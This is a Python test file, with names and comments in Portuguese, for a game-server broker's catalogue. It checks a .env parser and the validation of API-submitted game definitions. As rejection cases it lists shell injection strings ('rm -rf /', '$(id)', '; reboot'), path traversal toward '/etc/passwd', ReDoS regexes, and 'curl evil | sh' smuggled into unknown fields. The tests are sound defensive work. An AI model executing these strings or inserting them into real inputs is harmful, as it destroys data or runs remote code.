"""Catalogo: leitura do .env sem shell e validacao dos jogos cadastrados pela API."""
from __future__ import annotations

import json
from pathlib import Path

import pytest

from broker import catalogo as cat
from broker.erros import Conflito, ErroDeValidacao, NaoEncontrado

RAIZ = Path(__file__).resolve().parent.parent


# --- parser do .env -------------------------------------------------------

def test_env_le_valores_simples_e_ignora_comentarios():
    dados = cat.ler_env('# cabecalho\nA=1\nB="dois palavras"  # nota\nC=tres # nota\n\nD=\n')
    assert dados == {"A": "1", "B": "dois palavras", "C": "tres", "D": ""}


def test_env_nao_expande_nada():
    dados = cat.ler_env('X="-a $(id) `whoami` $HOME"\n')
    assert dados["X"] == "-a $(id) `whoami` $HOME"


def test_env_aspas_simples_multilinha_e_apostrofo_escapado():
    texto = "PRE='\necho \"oi\"\necho it'\\''s ok\n'\nDEPOIS=1\n"
    dados = cat.ler_env(texto)
    assert "echo it's ok" in dados["PRE"]
    assert dados["DEPOIS"] == "1", "a linha depois do bloco multilinha continua sendo lida"


def test_env_aspas_duplas_com_escape():
    assert cat.ler_env(r'A="uma \"citacao\" e \$var"')["A"] == 'uma "citacao" e $var'


def test_env_aspas_sem_fechar_e_erro():
    with pytest.raises(ValueError, match="aspas sem fechar"):
        cat.ler_env("A='abc\nB=1\n")


# --- catalogo curado (arquivos reais do repositorio) -----------------------

def test_todos_os_env_do_repo_sao_lidos_sem_erro():
    jogos, erros = cat.carregar_curado(RAIZ / "games")
    assert erros == []
    assert "palworld" in jogos


def test_palworld_e_criavel_e_dayz_e_teamspeak_nao():
    jogos, _ = cat.carregar_curado(RAIZ / "games")
    assert jogos["palworld"].criavel
    assert cat.Porta(8211, "udp") in jogos["palworld"].portas
    assert not jogos["dayz"].criavel
    assert "conta Steam" in jogos["dayz"].motivo
    assert not jogos["teamspeak"].criavel
    assert "instalador proprio" in jogos["teamspeak"].motivo


def test_hooks_do_curado_nunca_aparecem_na_api():
    jogos, _ = cat.carregar_curado(RAIZ / "games")
    palworld = jogos["palworld"]
    assert palworld.tem_hooks
    publico = json.dumps(palworld.publico())
    assert "steamclient" not in publico
    assert "install" not in publico.lower()


def test_arquivo_ruim_vira_erro_e_nao_derruba_o_resto(tmp_path):
    (tmp_path / "bom.env").write_text("GAME_KEY=bom\nSTEAM_APP_ID=1\nGAME_PORTS=7000/udp\n")
    (tmp_path / "ruim.env").write_text("GAME_KEY=Ruim_Chave\n")
    jogos, erros = cat.carregar_curado(tmp_path)
    assert list(jogos) == ["bom"]
    assert len(erros) == 1
    assert "ruim.env" in erros[0]


# --- validacao do jogo dinamico --------------------------------------------

def test_jogo_dinamico_valido(dados_de_jogo):
    jogo = cat.validar_dinamico(dados_de_jogo)
    assert jogo.criavel
    assert jogo.origem == cat.ORIGEM_DINAMICO
    assert not jogo.tem_hooks
    assert jogo.portas == (cat.Porta(7777, "udp"), cat.Porta(27016, "udp"))


def test_ida_e_volta_pelo_formato_gravado(dados_de_jogo):
    jogo = cat.validar_dinamico(dados_de_jogo)
    assert cat.validar_dinamico(jogo.dados_dinamicos()) == jogo


CASOS_INVALIDOS = [
    # comando de shell escondido em argumento
    ("start_args", "-x; rm -rf /"), ("start_args", "$(id)"), ("start_args", "`id`"),
    ("start_args", "a | b"), ("start_args", "a && b"), ("start_args", "-p {OUTRO}"),
    ("start_args", "a\nb"), ("start_args", "x" * 301),
    # caminhos
    ("start_script", "../../bin/sh"), ("start_script", "/bin/sh"), ("start_script", "a b"),
    ("config_path", "/etc"), ("config_path", "/opt/game/../../etc"),
    ("config_files", ["/etc/passwd"]), ("config_files", "nao-e-lista"),
    ("backup_paths", ["/opt/game/.."]), ("log_path", "/var/log/x"),
    # identidade
    ("chave", "Bad_Key"), ("chave", "a"), ("chave", "x" * 30), ("chave", "a;b"),
    ("nome", "x;y"), ("nome", ""), ("nome", "n" * 41),
    # numeros
    ("app_id", "123"), ("app_id", True), ("app_id", 0), ("app_id", 2**31),
    ("memoria_mb", 10**9), ("cores", True), ("disco_gb", 1),
    # portas
    ("portas", []), ("portas", ["80/tcp"]), ("portas", ["1023/udp"]), ("portas", ["8080/tcp"]),
    ("portas", ["8006/tcp"]), ("portas", ["25575/tcp"]), ("portas", ["99999/udp"]),
    ("portas", ["7777/udp", "7777/udp"]), ("portas", ["7777"]), ("portas", ["7777/icmp"]),
    ("porta_jogo", 9999), ("porta_query", 1234),
    # enums
    ("plataforma", "freebsd"), ("player_source", "http"), ("receitas", ["rm -rf /"]),
    ("deslocavel", "sim"),
    # regex do log
    ("join_re", "(a+)+$"), ("join_re", "(.*)*x"), ("join_re", "(a|b*)+"), ("join_re", "x" * 201),
    ("join_re", "("),
]


@pytest.mark.parametrize(("campo", "valor"), CASOS_INVALIDOS, ids=lambda v: repr(v)[:30])
def test_campo_invalido_e_recusado(dados_de_jogo, campo, valor):
    dados_de_jogo[campo] = valor
    with pytest.raises(ErroDeValidacao) as erro:
        cat.validar_dinamico(dados_de_jogo)
    assert campo in str(erro.value)


@pytest.mark.parametrize("campo", ["pre_install_cmd", "post_install_cmd", "provision_script", "PRE_INSTALL_CMD", "x"])
def test_campo_desconhecido_e_recusado_para_nao_entrar_comando_de_contrabando(dados_de_jogo, campo):
    dados_de_jogo[campo] = "curl evil | sh"
    with pytest.raises(ErroDeValidacao, match="desconhecido"):
        cat.validar_dinamico(dados_de_jogo)


@pytest.mark.parametrize("corpo", [None, [], "texto", 7])
def test_corpo_que_nao_e_objeto_e_recusado(corpo):
    with pytest.raises(ErroDeValidacao, match="objeto JSON"):
        cat.validar_dinamico(corpo)


@pytest.mark.parametrize("campo", ["chave", "nome", "app_id", "portas", "porta_jogo"])
def test_campo_obrigatorio_ausente(dados_de_jogo, campo):
    del dados_de_jogo[campo]
    with pytest.raises(ErroDeValidacao, match="obrigatorio"):
        cat.validar_dinamico(dados_de_jogo)


def test_jogo_de_windows_exige_receita_de_windows(dados_de_jogo):
    dados_de_jogo["plataforma"] = "windows"
    dados_de_jogo["receitas"] = []
    with pytest.raises(ErroDeValidacao, match="wine"):
        cat.validar_dinamico(dados_de_jogo)
    dados_de_jogo["receitas"] = ["wine"]
    assert cat.validar_dinamico(dados_de_jogo).receitas == ("wine",)


def test_so_o_minimo_basta(dados_de_jogo):
    minimo = {k: dados_de_jogo[k] for k in ("chave", "nome", "app_id", "portas", "porta_jogo")}
    jogo = cat.validar_dinamico(minimo)
    assert (jogo.memoria_mb, jogo.cores, jogo.disco_gb) == (4096, 2, 20)
    assert jogo.player_source == "log"


# --- Catalogo (curado + dinamico) -------------------------------------------

def test_catalogo_lista_curados_menos_o_template(catalogo):
    assert [j.chave for j in catalogo.listar()] == ["alfa", "beta", "conta", "delta"]


def test_adicionar_persiste_e_sobrevive_a_recarga(catalogo, dados_de_jogo, tmp_path):
    catalogo.adicionar_dinamico(dados_de_jogo)
    outro = cat.Catalogo(tmp_path / "games", tmp_path / "dinamico")
    assert outro.obter("meujogo").nome == "Meu Jogo"
    assert outro.erros == []


def test_adicionar_chave_de_jogo_curado_e_conflito(catalogo, dados_de_jogo):
    dados_de_jogo["chave"] = "alfa"
    with pytest.raises(Conflito):
        catalogo.adicionar_dinamico(dados_de_jogo)


def test_adicionar_duas_vezes_e_conflito(catalogo, dados_de_jogo):
    catalogo.adicionar_dinamico(dados_de_jogo)
    with pytest.raises(Conflito):
        catalogo.adicionar_dinamico(dados_de_jogo)


def test_jogo_recusado_nao_deixa_arquivo(catalogo, dados_de_jogo, tmp_path):
    dados_de_jogo["start_args"] = "; reboot"
    with pytest.raises(ErroDeValidacao):
        catalogo.adicionar_dinamico(dados_de_jogo)
    assert list((tmp_path / "dinamico").glob("*")) == []


def test_arquivo_adulterado_em_disco_nao_vira_jogo(catalogo, dados_de_jogo, tmp_path):
    catalogo.adicionar_dinamico(dados_de_jogo)
    arquivo = tmp_path / "dinamico" / "meujogo.json"
    adulterado = json.loads(arquivo.read_text())
    adulterado["pre_install_cmd"] = "curl evil | sh"
    arquivo.write_text(json.dumps(adulterado))
    outro = cat.Catalogo(tmp_path / "games", tmp_path / "dinamico")
    with pytest.raises(NaoEncontrado):
        outro.obter("meujogo")
    assert any("meujogo.json" in e for e in outro.erros)


def test_arquivo_com_nome_diferente_da_chave_e_ignorado(catalogo, dados_de_jogo, tmp_path):
    catalogo.adicionar_dinamico(dados_de_jogo)
    (tmp_path / "dinamico" / "meujogo.json").rename(tmp_path / "dinamico" / "outro.json")
    outro = cat.Catalogo(tmp_path / "games", tmp_path / "dinamico")
    with pytest.raises(NaoEncontrado):
        outro.obter("meujogo")


def test_jogo_desconhecido(catalogo):
    with pytest.raises(NaoEncontrado):
        catalogo.obter("nao-existe")
